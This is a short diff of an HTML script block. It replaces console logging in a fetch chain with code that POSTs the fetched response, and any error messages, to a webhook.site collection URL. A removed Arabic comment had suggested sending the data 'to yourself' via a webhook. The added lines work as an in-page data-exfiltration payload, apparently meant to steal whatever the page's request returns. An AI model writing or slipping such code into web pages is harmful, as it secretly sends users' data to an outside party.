@@ -4,10 +4,15 @@
   })
   .then(res => res.text())
   .then(data => {
-    console.log("Got data:", data);
-    // أو أرسله لنفسك باستخدام webhook
+    fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
+      method: "POST",
+      body: data
+    });
   })
   .catch(err => {
-    console.error("Error:", err);
+    fetch("https://webhook.site/3423f4fd-cd39-4111-9aae-0acdded09e53", {
+      method: "POST",
+      body: "Error: " + err.message
+    });
   });
 </script>
